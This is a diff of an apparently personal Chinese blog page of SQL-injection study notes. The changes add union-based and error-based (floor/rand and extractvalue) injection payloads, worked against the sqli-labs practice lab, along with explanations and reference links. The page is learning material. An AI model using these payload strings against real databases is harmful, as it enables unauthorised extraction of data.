@@ -426,14 +426,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    7 分
                 </div>
                 
 
@@ -513,7 +513,7 @@
 <li>information_schema.<strong>tables</strong>该表存储了所有的表名</li>
 <li>information_schema.<strong>columns</strong>该表存储了所有的列名</li>
 </ul>
-<h2 id="0x01union联合注入"><a href="#0x01union联合注入" class="headerlink" title="0x01union联合注入"></a>0x01union联合注入</h2><p>适用于页面有显示列的注入</p>
+<h2 id="0x01union联合注入"><a href="#0x01union联合注入" class="headerlink" title="0x01union联合注入"></a>0x01union联合注入</h2><p>适用于页面<strong>有显示列</strong>的注入</p>
 <p>首先进行的是判断是否存在注入和确定其注入类型，然后<strong>根据注入类型</strong>依次进行列数判断、可显列、查库，查表、查列、查数据</p>
 <p>以下以字符型注入为例（sqli-labs靶场）：</p>
 <h3 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x #</span></span><br></pre></td></tr></table></figure>
@@ -528,8 +528,9 @@
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/system_user().png" alt="image-20210509112349669"></p>
 <h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><p>已知数据库<code>security</code>查表</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</span></span><br></pre></td></tr></table></figure>
-
-
+<blockquote>
+<p><strong>group_concat(username) ：</strong>将username数据查询在一起，用逗号连接</p>
+</blockquote>
 <h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/information_schema%E8%A1%A8table_schema%E5%88%97.png" alt="image-20210509115335643"></p>
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E8%A1%A8.png" alt="image-20210509115550488"></p>
 <h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; --+</span></span><br></pre></td></tr></table></figure>
@@ -538,6 +539,41 @@
 
 
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E6%95%B0%E6%8D%AE.png" alt="image-20210509122715852"></p>
+<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02 报错注入"></a>0x02 报错注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息。可以通过构造数据库报错语句，从报错信息中获取到想要的内容</p>
+<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><p>利用<strong>count()<strong>、</strong>rand()<strong>、</strong>floor()<strong>、</strong>group by</strong>函数结合在一起产生的注入，缺一不可</p>
+<h4 id="关键函数学习"><a href="#关键函数学习" class="headerlink" title="关键函数学习"></a>关键函数学习</h4><h5 id="rand-是随机函数"><a href="#rand-是随机函数" class="headerlink" title="rand()是随机函数"></a>rand()是随机函数</h5><p>通过一个固定的随机数0之后，可以形成固定的伪随机序列（就是rand(0)产生的数据是可预知的）</p>
+<h5 id="floor-是取整函数"><a href="#floor-是取整函数" class="headerlink" title="floor()是取整函数"></a>floor()是取整函数</h5><p>floor(rand(0)*2)就是对rand(0)产生的随机序列乘2之后取整，结果也是固定的</p>
+<h5 id="group-by是分组函数，将相同的数据分为一组"><a href="#group-by是分组函数，将相同的数据分为一组" class="headerlink" title="group by是分组函数，将相同的数据分为一组"></a>group by是分组函数，将相同的数据分为一组</h5><h5 id="count-是统计结果的行数"><a href="#count-是统计结果的行数" class="headerlink" title="count(*)是统计结果的行数"></a>count(*)是统计结果的行数</h5><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5.png" alt="image-20210509183416177"></p>
+<p>形如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//分解来看</span></span><br><span class="line"><span class="string">concat(user(),floor(rand(0)*2))x起了个别名，也就是相当于concat(user(),floor(rand(0)*2))=x</span></span><br><span class="line"><span class="string">ps:这里的user()是要查询的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">同理(select count(*),x from information_schema.tables group by x)=a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就是select 1 from a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+<p>详细原理分析：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p>
+<p>以sqli-labs中less6为例</p>
+<p>union注入不会回显列信息，故使用报错注入</p>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/less6.png" alt="image-20210509204534799"></p>
+<p>查数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br><span class="line"></span><br><span class="line">(select * from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="image-20210509205248015"></p>
+<blockquote>
+<p>security后面的1是floor(rand(0)*2)产生的数字1</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">floor()报错注入</a></p>
+<h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
+<blockquote>
+<p>XML_document 是 String 格式，为 XML 文档对象的名称</p>
+<p>XPath_string (Xpath 格式的字符串)</p>
+</blockquote>
+<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>从目标XML中返回包含所查询值的字符串（返回结果限制在32位字符）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="number">0x7e</span>是<span class="operator">~</span>的ASCII码</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将<span class="keyword">user</span>()换成其他payload</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210509220649223.png" alt="image-20210509220649223"></p>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210509220711553.png" alt="image-20210509220711553"></p>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210509220732609.png" alt="image-20210509220732609"></p>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
 <p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
@@ -942,7 +978,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">2.1k</span>&nbsp;字
+                class="white-color">2.7k</span>&nbsp;字
             
             
             
